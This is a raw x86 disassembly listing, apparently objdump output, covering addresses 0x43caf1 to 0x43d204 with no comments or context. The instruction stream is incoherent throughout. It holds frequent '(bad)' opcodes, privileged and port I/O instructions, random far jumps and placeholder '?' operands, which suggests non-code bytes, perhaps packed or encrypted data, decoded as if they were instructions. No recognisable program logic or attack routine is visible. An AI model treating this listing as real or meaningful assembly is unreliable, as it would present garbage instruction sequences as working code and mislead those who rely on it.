  43caf1:	les    ebp,FWORD PTR [eax+0x6ab3008d]
  43caf7:	inc    ebp
  43caf8:	sbb    edx,DWORD PTR [edx-0xc]
  43cafb:	ds jb  0x43caf3
  43cafe:	adc    ebx,DWORD PTR [eax]
  43cb00:	fidiv  WORD PTR [edx]
  43cb02:	push   esi
  43cb03:	dec    edx
  43cb04:	dec    esi
  43cb05:	or     ebp,esi
  43cb07:	imul   BYTE PTR [esi]
  43cb09:	fwait
  43cb0a:	(bad)  
  43cb0b:	mov    cl,0x4f
  43cb0d:	int    0x39
  43cb0f:	jmp    0xb3202d22
  43cb14:	fiadd  WORD PTR [esi]
  43cb16:	pusha  
  43cb17:	std    
  43cb18:	outs   dx,DWORD PTR ds:[esi]
  43cb19:	push   ds
  43cb1a:	xchg   ebx,eax
  43cb1b:	inc    esp
  43cb1c:	pop    esi
  43cb1d:	jo     0x43cb3e
  43cb1f:	push   ebx
  43cb20:	mov    ds:0x7e2c30a5,al
  43cb25:	pusha  
  43cb26:	inc    edx
  43cb27:	pop    ds
  43cb28:	rsqrtps xmm3,XMMWORD PTR [edi-0x35]
  43cb2c:	js     0x43cad7
  43cb2e:	out    0x6,eax
  43cb30:	es pop ebp
  43cb32:	(bad)  
  43cb34:	cmp    eax,0x96873824
  43cb39:	ret    0xa446
  43cb3c:	mov    edi,DWORD PTR [ebx-0x2cfd982]
  43cb42:	jne    0x43cb70
  43cb44:	sub    DWORD PTR [ebp+0x685ec276],edi
  43cb4a:	inc    eax
  43cb4b:	stc    
  43cb4c:	fsubr  QWORD PTR [ebp+0x611d1eca]
  43cb52:	nop
  43cb53:	jmp    0x43cb90
  43cb55:	dec    ecx
  43cb56:	dec    ebp
  43cb57:	mov    gs,ebx
  43cb59:	mov    dh,0x1f
  43cb5b:	outs   dx,DWORD PTR ds:[esi]
  43cb5c:	pop    ebx
  43cb5d:	loope  0x43cb7b
  43cb5f:	xchg   ebp,eax
  43cb60:	jbe    0x43cbc6
  43cb62:	push   eax
  43cb63:	xchg   ecx,eax
  43cb64:	jne    0x43cbb8
  43cb66:	or     dl,BYTE PTR [ecx+ebp*2-0x43f31103]
  43cb6d:	jns    0x43cb80
  43cb6f:	mov    bl,0x93
  43cb71:	cmp    al,0xee
  43cb73:	and    eax,0xc8de4144
  43cb78:	in     eax,dx
  43cb79:	pusha  
  43cb7a:	push   edx
  43cb7b:	and    bh,ch
  43cb7d:	and    BYTE PTR [edi],0x61
  43cb80:	or     cl,BYTE PTR [ebx-0x12]
  43cb83:	cmp    cl,BYTE PTR [ebx]
  43cb85:	push   esp
  43cb86:	adc    DWORD PTR [ebx+eiz*2+0x7ea5f09e],eax
  43cb8d:	fs push ebp
  43cb8f:	mov    ebp,0x7bfca092
  43cb94:	inc    eax
  43cb95:	mov    eax,ds:0x5d7e665a
  43cb9a:	out    dx,al
  43cb9b:	cs push esi
  43cb9d:	in     eax,0xd8
  43cb9f:	outs   dx,BYTE PTR ds:[esi]
  43cba0:	mov    ebx,0xdc9ef667
  43cba5:	mov    ecx,0x365e4a48
  43cbaa:	test   DWORD PTR [esi],edx
  43cbac:	jp     0x43cbef
  43cbae:	out    dx,eax
  43cbaf:	pop    es
  43cbb0:	mov    ecx,0xc484117
  43cbb5:	icebp  
  43cbb6:	mov    ecx,ebp
  43cbb8:	fnstenv [esi+ebp*1-0x13d9ca5e]
  43cbbf:	int3   
  43cbc0:	sbb    al,BYTE PTR [ebx]
  43cbc2:	out    dx,al
  43cbc3:	cmp    BYTE PTR [ebp-0x716bdccf],bl
  43cbc9:	test   DWORD PTR [eax],0xee74d1b2
  43cbcf:	pop    ebx
  43cbd0:	lods   al,BYTE PTR ds:[esi]
  43cbd1:	out    dx,eax
  43cbd2:	loopne 0x43cc01
  43cbd4:	push   0x59
  43cbd6:	adc    dh,bl
  43cbd8:	dec    ecx
  43cbd9:	push   0xffffffd2
  43cbdb:	pusha  
  43cbdc:	inc    ebx
  43cbdd:	pop    edx
  43cbde:	xchg   edi,eax
  43cbdf:	jno    0x43cc3f
  43cbe1:	sub    DWORD PTR [edx-0x48e36886],esi
  43cbe7:	hlt    
  43cbe8:	(bad)  [eax+0x58]
  43cbeb:	and    bl,BYTE PTR [ebx]
  43cbed:	or     eax,0x54423023
  43cbf2:	hlt    
  43cbf3:	pop    ss
  43cbf4:	inc    esi
  43cbf5:	pop    edi
  43cbf6:	out    dx,al
  43cbf7:	mov    eax,cs
  43cbf9:	dec    ebx
  43cbfa:	add    eax,ecx
  43cbfc:	outs   dx,BYTE PTR ds:[esi]
  43cbfd:	mov    dl,0xe1
  43cbff:	lahf   
  43cc00:	das    
  43cc01:	enter  0xefa6,0x3e
  43cc05:	ss mov ah,0x79
  43cc08:	or     BYTE PTR [edx+ebp*8],bh
  43cc0b:	dec    esi
  43cc0c:	fisttp WORD PTR [ebx+esi*8+0x75efde82]
  43cc13:	inc    edi
  43cc14:	js     0x43cc76
  43cc16:	cmp    esi,DWORD PTR [esi-0x7e]
  43cc19:	xchg   ebx,eax
  43cc1a:	sbb    BYTE PTR [ebp+0x4e],0x4c
  43cc1e:	out    dx,al
  43cc1f:	mov    WORD PTR [ebx+ebx*4+0x25],?
  43cc23:	scas   eax,DWORD PTR es:[edi]
  43cc24:	push   edi
  43cc25:	out    dx,al
  43cc26:	cmp    al,0xeb
  43cc28:	mov    edi,DWORD PTR [eax-0x1ee55eca]
  43cc2e:	adc    BYTE PTR [eax-0x767ae287],0x5e
  43cc35:	js     0x43cc69
  43cc37:	fwait
  43cc38:	sub    al,0x52
  43cc3a:	adc    eax,DWORD PTR [ecx-0x5f53dd85]
  43cc40:	adc    ch,bl
  43cc42:	imul   ebx,ebx,0x2028a5a7
  43cc48:	push   0x27
  43cc4a:	in     eax,dx
  43cc4b:	jne    0x43cbe4
  43cc4d:	test   BYTE PTR [esi],cl
  43cc4f:	scas   al,BYTE PTR es:[edi]
  43cc50:	or     bl,BYTE PTR [ebx]
  43cc52:	pop    edx
  43cc53:	jae    0x43cc85
  43cc55:	add    eax,0x5b5d444c
  43cc5a:	scas   al,BYTE PTR es:[edi]
  43cc5b:	xor    eax,0x5d10fa72
  43cc60:	pop    ss
  43cc61:	xor    ebp,esi
  43cc63:	and    DWORD PTR [ebx+0x53],esp
  43cc66:	das    
  43cc67:	cmp    dl,BYTE PTR [ebp-0x7]
  43cc6a:	rcr    BYTE PTR [esi-0x637f662a],cl
  43cc70:	push   ds
  43cc71:	and    al,0xe
  43cc73:	aad    0x1b
  43cc75:	xchg   ebx,eax
  43cc76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43cc77:	dec    ebp
  43cc78:	pop    esi
  43cc79:	jnp    0x43cc8e
  43cc7b:	fld    TBYTE PTR [ebx+ecx*8+0x5cb5cf86]
  43cc82:	jo     0x43cc29
  43cc84:	in     eax,dx
  43cc85:	daa    
  43cc86:	push   eax
  43cc87:	sub    ebx,DWORD PTR [esi+0x531b4877]
  43cc8d:	inc    ebp
  43cc8e:	jmp    0xb6e52968
  43cc93:	adc    edx,ebx
  43cc95:	int3   
  43cc96:	repnz pusha 
  43cc98:	pop    esi
  43cc99:	pop    ss
  43cc9a:	mov    cl,BYTE PTR [edi-0x568f374d]
  43cca0:	jmp    0xee93:0x25f6d451
  43cca7:	pop    ss
  43cca8:	cmp    al,0x81
  43ccaa:	fistp  QWORD PTR [ebx+ebx*2+0x6f]
  43ccae:	push   edi
  43ccaf:	mov    ds:0xab4b2d86,eax
  43ccb4:	in     al,0xc8
  43ccb6:	push   ss
  43ccb7:	es cwde 
  43ccb9:	inc    ebx
  43ccba:	xor    esp,DWORD PTR [ecx-0x6d]
  43ccbd:	pusha  
  43ccbe:	aaa    
  43ccbf:	push   0xffffff85
  43ccc1:	jecxz  0x43ccc2
  43ccc3:	(bad)  
  43ccc4:	pop    edi
  43ccc5:	shl    BYTE PTR [ecx-0x7],0x50
  43ccc9:	les    ecx,FWORD PTR [ebx+0x11]
  43cccc:	out    0x3a,eax
  43ccce:	mov    al,ds:0x96bef5a1
  43ccd3:	test   eax,0x5e568e0d
  43ccd8:	pop    esi
  43ccd9:	call   0x3564:0xc2b17af1
  43cce0:	ins    BYTE PTR es:[edi],dx
  43cce1:	inc    edx
  43cce2:	jb     0x43cd55
  43cce4:	add    eax,0x19e37e21
  43cce9:	mov    BYTE PTR [ebx-0x5dbfa18e],cl
  43ccef:	fnstsw WORD PTR [eax-0x20a07bb6]
  43ccf5:	pusha  
  43ccf6:	adc    DWORD PTR [ebp+0x325f1589],eax
  43ccfc:	dec    edx
  43ccfd:	inc    edi
  43ccfe:	out    dx,al
  43ccff:	call   0x22b4b80a
  43cd04:	dec    esi
  43cd05:	xchg   BYTE PTR [edi],ch
  43cd07:	mov    eax,ds:0x7a87f525
  43cd0c:	xor    DWORD PTR [edx],ecx
  43cd0e:	mov    DWORD PTR [esi],edx
  43cd10:	and    eax,edi
  43cd12:	bound  eax,QWORD PTR ds:0xdea74e64
  43cd18:	mov    esi,0xdbc85ed2
  43cd1d:	add    ch,dh
  43cd1f:	or     DWORD PTR [edi-0x28],edi
  43cd22:	in     al,dx
  43cd23:	(bad)
  43cd26:	mov    ecx,0xea5bac10
  43cd2b:	xchg   ecx,eax
  43cd2c:	cdq    
  43cd2d:	lods   al,BYTE PTR ds:[esi]
  43cd2e:	pop    ecx
  43cd2f:	mov    eax,ds:0x1634faa9
  43cd34:	pop    edi
  43cd35:	fiadd  DWORD PTR [esi+0x831592a]
  43cd3b:	push   0xffffffe7
  43cd3d:	rep cs stos BYTE PTR es:[edi],al
  43cd40:	cmp    ecx,DWORD PTR [ecx-0x37bc5f3a]
  43cd46:	mov    ebp,DWORD PTR [eax+0x1a]
  43cd49:	in     eax,dx
  43cd4a:	(bad)  
  43cd4b:	cmp    al,0xee
  43cd4d:	int    0xee
  43cd4f:	adc    bh,BYTE PTR [ebp-0x7a4e7dce]
  43cd55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cd56:	push   cs
  43cd57:	(bad)
  43cd5b:	popa   
  43cd5c:	jg     0x43cd0b
  43cd5e:	mov    ebx,0xee5d2d87
  43cd63:	lock jle 0x43cd2a
  43cd66:	sub    DWORD PTR [edx+ebx*1-0xc60cf78],edi
  43cd6d:	sub    BYTE PTR [esi-0x6b],dh
  43cd70:	jle    0x43cd56
  43cd72:	call   0xb3ea:0xee892743
  43cd79:	xor    edx,DWORD PTR [edx-0x43]
  43cd7c:	inc    ebx
  43cd7d:	dec    ecx
  43cd7e:	loop   0x43cd20
  43cd80:	sub    DWORD PTR [edx-0x25],ebp
  43cd83:	xchg   DWORD PTR [eax-0x79],ebp
  43cd86:	fcom   QWORD PTR [esi+0x5e]
  43cd89:	jns    0x43cd1a
  43cd8b:	pop    eax
  43cd8c:	je     0x43cda2
  43cd8e:	into   
  43cd8f:	sbb    DWORD PTR [edi],ebp
  43cd91:	popa   
  43cd92:	jmp    0x63ec:0xc47dfbe8
  43cd99:	dec    edx
  43cd9a:	out    dx,al
  43cd9b:	jp     0x43ce04
  43cd9d:	add    al,0x10
  43cd9f:	sar    BYTE PTR [edi-0xe],cl
  43cda2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cda3:	mov    al,ds:0x3845a9e1
  43cda8:	jecxz  0x43cd9b
  43cdaa:	pop    ebp
  43cdab:	loop   0x43ce0b
  43cdad:	cmp    al,0x68
  43cdaf:	mov    ds:0xbc4a7cae,eax
  43cdb4:	int    0x40
  43cdb6:	int    0x6
  43cdb8:	aam    0xf3
  43cdba:	mov    ch,0x8c
  43cdbc:	push   edx
  43cdbd:	push   eax
  43cdbe:	imul   ebx,DWORD PTR [esi+ebx*8+0x26],0x65
  43cdc3:	inc    ecx
  43cdc4:	mov    bh,0x7f
  43cdc6:	jl     0x43cd73
  43cdc8:	inc    edi
  43cdc9:	push   edx
  43cdca:	jmp    0x43cd9a
  43cdcc:	test   DWORD PTR [edi-0x45],eax
  43cdcf:	jno    0x43cdaf
  43cdd1:	stos   DWORD PTR es:[edi],eax
  43cdd2:	(bad)  
  43cdd3:	pop    edx
  43cdd4:	pop    esi
  43cdd5:	aas    
  43cdd6:	push   ecx
  43cdd7:	xchg   edx,eax
  43cdd8:	scas   eax,DWORD PTR es:[edi]
  43cdd9:	outs   dx,DWORD PTR ds:[esi]
  43cdda:	div    BYTE PTR [esi+0x1e]
  43cddd:	push   edx
  43cdde:	xchg   esi,eax
  43cddf:	mov    ds:0x9beedb85,al
  43cde4:	clc    
  43cde5:	or     edi,DWORD PTR [ecx-0x40]
  43cde8:	push   ss
  43cde9:	(bad)  
  43cdea:	jmp    0x2740:0xaef4e8a0
  43cdf1:	pop    ebp
  43cdf2:	cmp    esp,DWORD PTR [eax+0x3f33d8eb]
  43cdf8:	inc    BYTE PTR [edx-0x80]
  43cdfb:	jp     0x43ce32
  43cdfd:	xchg   edx,eax
  43cdfe:	(bad)  
  43cdff:	cmp    esi,DWORD PTR [ecx*1-0x66776f12]
  43ce06:	sbb    al,0x89
  43ce08:	or     al,0xb1
  43ce0a:	jle    0x43cdad
  43ce0c:	fdivr  QWORD PTR [eax+0x5ccc2d69]
  43ce12:	inc    eax
  43ce13:	push   cs
  43ce14:	dec    edi
  43ce15:	push   ecx
  43ce16:	lods   al,BYTE PTR ds:[esi]
  43ce17:	bound  esi,QWORD PTR [edi+0x5f]
  43ce1a:	gs addr16 mov ch,0x13
  43ce1e:	lods   eax,DWORD PTR ds:[esi]
  43ce1f:	add    BYTE PTR [ebx],cl
  43ce21:	inc    ebp
  43ce22:	out    dx,al
  43ce23:	pop    es
  43ce24:	add    eax,0x6d75a8fe
  43ce29:	mov    bh,0x96
  43ce2b:	test   al,0x27
  43ce2d:	or     ch,BYTE PTR [ebx+0xef1f6c1]
  43ce33:	outs   dx,BYTE PTR ds:[esi]
  43ce34:	fcomp  DWORD PTR [edx+edi*1+0x60f454bc]
  43ce3b:	xlat   BYTE PTR ds:[ebx]
  43ce3c:	push   ds
  43ce3d:	test   eax,ebx
  43ce3f:	and    eax,0xa14d36b6
  43ce44:	mov    ebp,0x205a77ae
  43ce49:	ja     0x43cdd5
  43ce4b:	ins    BYTE PTR es:[edi],dx
  43ce4c:	pop    esi
  43ce4d:	jae    0x43ceb3
  43ce4f:	ret    
  43ce50:	out    dx,eax
  43ce51:	mov    ss,edi
  43ce53:	xor    DWORD PTR [ebp+0x2d],edi
  43ce56:	xor    al,0xa1
  43ce58:	data16 into 
  43ce5a:	imul   ecx,ecx,0x7e83384a
  43ce60:	pop    esi
  43ce61:	sub    esi,ebx
  43ce63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ce64:	clc    
  43ce65:	aas    
  43ce66:	stos   DWORD PTR es:[edi],eax
  43ce67:	retf   0x60c9
  43ce6a:	xchg   ebx,eax
  43ce6b:	mov    esp,0xbe0d162c
  43ce70:	push   eax
  43ce71:	xor    eax,0x611eb925
  43ce76:	sub    cl,BYTE PTR [edi+0x1df982a6]
  43ce7c:	arpl   WORD PTR [ecx+0x35],sp
  43ce7f:	add    al,0xbf
  43ce81:	aam    0xd4
  43ce83:	loope  0x43ce85
  43ce85:	mov    ds:0x52984c24,al
  43ce8a:	aaa    
  43ce8b:	retf   0x409c
  43ce8e:	push   ss
  43ce8f:	sub    DWORD PTR [ebp+ebp*8+0x3d],ecx
  43ce93:	ja     0x43ce5f
  43ce95:	pusha  
  43ce96:	xchg   ecx,eax
  43ce97:	sahf   
  43ce98:	iret   
  43ce99:	rcl    BYTE PTR [esi-0x115781ca],1
  43ce9f:	inc    esi
  43cea0:	enter  0xacd6,0x87
  43cea4:	or     eax,DWORD PTR [eax]
  43cea6:	add    BYTE PTR [ecx+0x50705964],ah
  43ceac:	mul    DWORD PTR [edi-0x58]
  43ceaf:	pop    edx
  43ceb0:	push   ecx
  43ceb1:	nop
  43ceb2:	jbe    0x43cf26
  43ceb4:	fisubr WORD PTR [eax]
  43ceb6:	sbb    esi,DWORD PTR [ebx-0x114634bb]
  43cebc:	int    0x5c
  43cebe:	jns    0x43cf28
  43cec0:	mov    al,ds:0x9d60d5e9
  43cec5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43cec6:	xor    ah,bh
  43cec8:	pop    esi
  43cec9:	cwde   
  43ceca:	hlt    
  43cecb:	xchg   esp,eax
  43cecc:	xchg   dh,ah
  43cece:	(bad)  
  43cecf:	fsubr  DWORD PTR [edi+0x59]
  43ced2:	add    DWORD PTR [edi],edx
  43ced4:	inc    ecx
  43ced5:	xchg   esi,eax
  43ced6:	push   cs
  43ced7:	and    esi,ebp
  43ced9:	jl     0x43cefb
  43cedb:	fstp   QWORD PTR [esi-0x12]
  43cede:	sahf   
  43cedf:	adc    ebx,DWORD PTR [ecx-0x5f]
  43cee2:	mov    al,ds:0xb60c8b1
  43cee7:	cmp    DWORD PTR [edi+0x451a660d],esp
  43ceed:	cwde   
  43ceee:	add    ch,bh
  43cef0:	push   eax
  43cef1:	shr    DWORD PTR [esi],cl
  43cef3:	adc    eax,DWORD PTR [esi+0x7494437b]
  43cef9:	pusha  
  43cefa:	aam    0xdc
  43cefc:	ss loop 0x43cefd
  43ceff:	mov    dh,0x72
  43cf01:	fsubp  st(6),st
  43cf03:	sub    eax,0xc78ab416
  43cf08:	inc    esi
  43cf09:	fisttp QWORD PTR [eax+0x62ed5a1]
  43cf0f:	loope  0x43ceb6
  43cf11:	xchg   ecx,eax
  43cf12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43cf13:	jl     0x43cf73
  43cf15:	sbb    ebx,DWORD PTR [esi]
  43cf17:	mov    dl,0xa0
  43cf19:	or     al,0xc4
  43cf1b:	jle    0x43cf43
  43cf1d:	popa   
  43cf1e:	add    ch,BYTE PTR [esi-0x6ca10696]
  43cf24:	dec    edx
  43cf25:	jmp    0x43cf0e
  43cf27:	mov    ebp,0xe6542cc9
  43cf2c:	push   ds
  43cf2d:	(bad)  
  43cf2e:	icebp  
  43cf2f:	sbb    eax,0x3d02612c
  43cf34:	jb     0x43cf7b
  43cf36:	sub    BYTE PTR [edi+0x27ea58a0],0xce
  43cf3d:	pop    ecx
  43cf3e:	pop    ds
  43cf3f:	test   dh,bl
  43cf41:	jbe    0x43cf0d
  43cf43:	sub    al,0x8e
  43cf45:	pusha  
  43cf46:	out    0x6a,al
  43cf48:	inc    ecx
  43cf49:	aad    0x12
  43cf4b:	shl    BYTE PTR [ebp+0x6c],1
  43cf4e:	out    dx,al
  43cf4f:	fisttp QWORD PTR [eax-0x44]
  43cf52:	lods   al,BYTE PTR ds:[esi]
  43cf53:	fild   QWORD PTR [eax+eiz*8-0xbb067b9]
  43cf5a:	or     BYTE PTR [ecx-0x30ceb800],ah
  43cf60:	or     DWORD PTR [edx-0x12],ebp
  43cf63:	rcr    bl,1
  43cf65:	aad    0xf2
  43cf67:	jge    0x43cf84
  43cf69:	inc    eax
  43cf6a:	sbb    ecx,DWORD PTR [edi+0x6168bb8e]
  43cf70:	inc    esi
  43cf71:	cmp    DWORD PTR [ebx-0x1146f0eb],edx
  43cf77:	mov    edi,0xdd7b754b
  43cf7c:	push   esi
  43cf7d:	xchg   BYTE PTR gs:[ecx-0x5acc6769],ah
  43cf84:	in     al,dx
  43cf85:	mov    ds:0x385de437,eax
  43cf8a:	pop    edi
  43cf8b:	clc    
  43cf8c:	aas    
  43cf8d:	(bad)  
  43cf8e:	(bad)  
  43cf8f:	adc    eax,0x850ab482
  43cf94:	push   edi
  43cf95:	popa   
  43cf96:	fstp   QWORD PTR [esi]
  43cf98:	push   esp
  43cf99:	ins    BYTE PTR es:[edi],dx
  43cf9a:	test   bh,0x5c
  43cf9d:	nop
  43cf9e:	and    al,0xaf
  43cfa0:	cs push edx
  43cfa2:	push   es
  43cfa3:	fiadd  DWORD PTR [edi+0x621fb620]
  43cfa9:	mov    edi,0xf0398f23
  43cfae:	sub    DWORD PTR [eax-0x5ec0d3c2],0x4d
  43cfb5:	xor    bl,BYTE PTR ds:0x142859eb
  43cfbb:	inc    ebx
  43cfbc:	pusha  
  43cfbd:	mov    ah,0x6e
  43cfbf:	ins    DWORD PTR es:[edi],dx
  43cfc0:	push   ss
  43cfc1:	jmp    0x43cf8b
  43cfc3:	scas   al,BYTE PTR es:[edi]
  43cfc4:	and    BYTE PTR ds:0xc9d7db6e,dl
  43cfca:	aam    0xca
  43cfcc:	out    0x74,eax
  43cfce:	not    DWORD PTR ds:0xc2a64313
  43cfd4:	pop    ebx
  43cfd5:	outs   dx,DWORD PTR ds:[esi]
  43cfd6:	jnp    0x43cffa
  43cfd8:	out    dx,al
  43cfd9:	nop
  43cfda:	mov    bl,0x77
  43cfdc:	test   al,0xf3
  43cfde:	les    esp,FWORD PTR es:[ebx-0x26]
  43cfe2:	pop    eax
  43cfe3:	jecxz  0x43d01d
  43cfe5:	data16 into 
  43cfe7:	or     DWORD PTR fs:[esi-0x48],ebp
  43cfeb:	mov    al,ds:0x96010315
  43cff0:	and    al,0x60
  43cff2:	jecxz  0x43d04f
  43cff4:	inc    edx
  43cff5:	pop    edx
  43cff6:	pop    ss
  43cff7:	mov    edx,0xa0e53b51
  43cffc:	cmp    dl,BYTE PTR [edx]
  43cffe:	fcmove st,st(2)
  43d000:	sub    BYTE PTR cs:[ebx+0x6788f0a1],dl
  43d007:	adc    eax,0x4c2a3277
  43d00c:	pop    edi
  43d00d:	or     dl,BYTE PTR [eax+0x61174ea8]
  43d013:	inc    ecx
  43d014:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d015:	inc    ebx
  43d016:	sub    DWORD PTR [ebp+0x2c],0x53
  43d01a:	adc    eax,DWORD PTR [eax+edi*4]
  43d01d:	and    ebx,DWORD PTR [edx+0x4ddf5e60]
  43d023:	push   ebp
  43d024:	outs   dx,DWORD PTR ds:[esi]
  43d025:	sub    BYTE PTR [edx],0xa4
  43d028:	pop    esi
  43d029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d02a:	aad    0x11
  43d02c:	(bad)  
  43d02d:	cli    
  43d02e:	popf   
  43d02f:	sbb    DWORD PTR [edi-0x3cb1efa0],edi
  43d035:	cs or  al,0xb8
  43d038:	mov    bh,0xa4
  43d03a:	out    dx,al
  43d03b:	and    ecx,DWORD PTR [ebp+0x57]
  43d03e:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  43d040:	mov    ds:0xeea0a8bc,eax
  43d045:	inc    esi
  43d046:	ins    DWORD PTR es:[edi],dx
  43d047:	in     eax,dx
  43d048:	aaa    
  43d049:	or     esi,DWORD PTR ds:0x43bb5ecb
  43d04f:	mov    ah,0x78
  43d051:	bound  ecx,QWORD PTR [edi]
  43d053:	loope  0x43d069
  43d055:	popa   
  43d056:	cdq    
  43d057:	push   cs
  43d058:	cmp    al,0xad
  43d05a:	push   es
  43d05b:	leave  
  43d05c:	repz mov eax,ds:0xf93707eb
  43d062:	sub    ah,dl
  43d064:	xor    ch,cl
  43d066:	out    0xd9,al
  43d068:	push   ds
  43d069:	inc    esp
  43d06a:	add    BYTE PTR [esi+ebp*1+0x21],dl
  43d06e:	shr    DWORD PTR [eax],cl
  43d070:	jle    0x43d03c
  43d072:	push   ebp
  43d073:	adc    esi,DWORD PTR [edi]
  43d075:	mov    ah,BYTE PTR [ecx-0x11ccc16d]
  43d07b:	jns    0x43d0aa
  43d07d:	push   es
  43d07e:	(bad)  
  43d07f:	inc    edi
  43d080:	jb     0x43d0e7
  43d082:	xchg   esp,eax
  43d083:	aad    0xb1
  43d085:	and    al,0xee
  43d087:	pop    ebx
  43d088:	cld    
  43d089:	adc    ebp,DWORD PTR [esi]
  43d08b:	and    ebx,DWORD PTR [ebx-0x3d094fba]
  43d091:	sahf   
  43d092:	in     al,dx
  43d093:	sub    DWORD PTR [ebp+0x7e3c41bb],ebp
  43d099:	sti    
  43d09a:	fisttp WORD PTR [ebx-0x1a689da2]
  43d0a0:	push   cs
  43d0a1:	mov    dh,0xf8
  43d0a3:	mov    ah,0x15
  43d0a5:	popa   
  43d0a6:	in     al,dx
  43d0a7:	add    DWORD PTR [edi+0x50],0x49
  43d0ab:	cs mov edx,0x8c33ee33
  43d0b1:	shl    DWORD PTR ds:[ecx+0x2f],0x28
  43d0b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d0b7:	mov    al,ds:0xeb15fc0d
  43d0bc:	mov    ebx,0x342c2c2d
  43d0c1:	pop    ecx
  43d0c2:	push   edx
  43d0c3:	mov    eax,ds:0xdfdd4672
  43d0c8:	lahf   
  43d0c9:	psubsw mm7,QWORD PTR [esi+esi*2+0x78a19aba]
  43d0d1:	fs inc ebp
  43d0d3:	pop    es
  43d0d4:	sub    eax,0xa60cee6d
  43d0d9:	mov    esi,0xb77a1f3f
  43d0de:	xchg   ebx,eax
  43d0df:	mov    eax,ds:0xafaba42
  43d0e4:	cmc    
  43d0e5:	dec    ecx
  43d0e6:	pop    edx
  43d0e7:	mov    ch,0xf0
  43d0e9:	and    al,0x0
  43d0eb:	ins    BYTE PTR es:[edi],dx
  43d0ec:	mov    bl,0xee
  43d0ee:	scas   al,BYTE PTR es:[edi]
  43d0ef:	push   ss
  43d0f0:	sahf   
  43d0f1:	push   cs
  43d0f2:	lea    esp,[ebx+0x14]
  43d0f5:	dec    edi
  43d0f6:	(bad)  
  43d0f7:	cmp    BYTE PTR [esi-0x60],dh
  43d0fa:	rcl    DWORD PTR [esi+0x5e715f6],1
  43d100:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d101:	jb     0x43d17d
  43d103:	mov    bl,0x8e
  43d105:	cli    
  43d106:	daa    
  43d107:	dec    esp
  43d108:	dec    ecx
  43d109:	inc    ebp
  43d10a:	jecxz  0x43d17a
  43d10c:	nop
  43d10d:	lahf   
  43d10e:	mov    ?,WORD PTR [edi-0xf29be30]
  43d114:	adc    eax,0x3234fc8d
  43d119:	jl     0x43d109
  43d11b:	mov    cl,0x9d
  43d11d:	(bad)
  43d121:	popa   
  43d122:	add    esp,edi
  43d124:	jl     0x43d163
  43d126:	lods   al,BYTE PTR ds:[esi]
  43d127:	add    BYTE PTR [edx+edx*8-0x11],bl
  43d12b:	ja     0x43d1a5
  43d12d:	mov    dh,0xd5
  43d12f:	pop    ds
  43d130:	aad    0x4d
  43d132:	out    dx,al
  43d133:	(bad)
  43d136:	in     al,0x65
  43d138:	sub    eax,0xaf23861
  43d13d:	leave  
  43d13e:	push   es
  43d13f:	dec    edi
  43d140:	pop    ebx
  43d141:	std    
  43d142:	out    dx,al
  43d143:	jo     0x43d0fe
  43d145:	shl    DWORD PTR [eax-0x1],0x73
  43d149:	pop    edx
  43d14a:	jle    0x43d0ed
  43d14c:	push   ecx
  43d14d:	or     al,0xce
  43d14f:	es mov ebx,0x5e1fb037
  43d155:	ror    BYTE PTR [edi+0x45],0xc3
  43d159:	and    eax,0x615fe859
  43d15e:	add    BYTE PTR [ebp+0x8f07071],al
  43d164:	cmp    al,BYTE PTR [edi-0x22a1fb26]
  43d16a:	ins    BYTE PTR es:[edi],dx
  43d16b:	cmc    
  43d16c:	shr    BYTE PTR [ebx+0x54],1
  43d16f:	sbb    ecx,DWORD PTR [ecx+ebp*8+0x4]
  43d173:	mov    al,0xdd
  43d175:	repz out dx,al
  43d177:	xchg   ebx,eax
  43d178:	pop    ds
  43d179:	aaa    
  43d17a:	ja     0x43d156
  43d17c:	xchg   edi,eax
  43d17d:	xchg   esi,ebp
  43d17f:	push   0x13eaa7b5
  43d184:	mov    esp,0xaef1162b
  43d189:	jp     0x43d123
  43d18b:	sub    eax,DWORD PTR [ebx]
  43d18d:	popa   
  43d18e:	jle    0x43d16b
  43d190:	mov    ds:0x5eb62cb9,al
  43d195:	inc    esp
  43d196:	mov    esp,DWORD PTR [ebx]
  43d198:	aad    0xd3
  43d19a:	inc    ecx
  43d19b:	daa    
  43d19c:	sbb    DWORD PTR [ebp+0x6],eax
  43d19f:	cli    
  43d1a0:	xchg   edx,eax
  43d1a1:	loopne 0x43d216
  43d1a3:	(bad)  
  43d1a4:	mov    bh,0x7b
  43d1a6:	mov    eax,ds:0x881e5ec2
  43d1ab:	push   ecx
  43d1ac:	dec    cl
  43d1ae:	mov    ebp,0xb8241a73
  43d1b3:	(bad)  
  43d1b4:	loope  0x43d196
  43d1b6:	mov    al,0x53
  43d1b8:	pop    ss
  43d1b9:	popa   
  43d1ba:	jbe    0x43d1dc
  43d1bc:	mov    es,WORD PTR [eax]
  43d1be:	or     al,0x1
  43d1c0:	pop    ebx
  43d1c1:	add    edi,ecx
  43d1c3:	ja     0x43d201
  43d1c5:	inc    ebx
  43d1c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d1c7:	test   al,0xaf
  43d1c9:	add    DWORD PTR [ebx-0x38777365],ebx
  43d1cf:	mov    ecx,0x696d5515
  43d1d4:	inc    eax
  43d1d5:	add    al,0x2e
  43d1d7:	aas    
  43d1d8:	pop    edi
  43d1d9:	sub    BYTE PTR [ecx-0x66],0x6c
  43d1dd:	loop   0x43d1fe
  43d1df:	sub    DWORD PTR [edx-0x40],ebp
  43d1e2:	and    BYTE PTR [ecx+0x1a2f15da],ah
  43d1e8:	sar    DWORD PTR [edi-0xf9cf45e],1
  43d1ee:	or     DWORD PTR [eax-0x31badee4],edx
  43d1f4:	(bad)  
  43d1f5:	sbb    edx,DWORD PTR [ecx+0x130324a1]
  43d1fb:	and    DWORD PTR [ebp+ecx*1+0x42],ebx
  43d1ff:	pop    eax
  43d200:	pop    esi
  43d201:	xchg   esi,eax
  43d202:	iret   
  43d203:	(bad)  
  43d204:	jl     0x43d1f7
